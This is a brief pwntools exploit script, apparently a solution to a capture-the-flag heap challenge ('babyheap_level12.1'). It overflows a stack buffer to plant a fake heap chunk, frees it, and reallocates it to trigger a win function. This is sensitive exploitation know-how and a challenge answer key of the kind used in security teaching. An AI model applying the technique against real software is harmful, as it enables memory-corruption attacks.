from pwn import *

p = process("/challenge/babyheap_level12.1")
#p = gdb.debug("/challenge/babyheap_level12.1")

fake_chunk = p64(0x0) + p64(0x41) + p64(0x0) + p64(0x0)
# stack_scanf + 0x40 = stack_free
p.sendline(b'stack_scanf')
#p.recv()
p.sendline(b'A' * 0x30 + fake_chunk)
p.recv()
p.sendline(b'stack_free')
p.sendline(b'stack_malloc_win')

p.interactive()

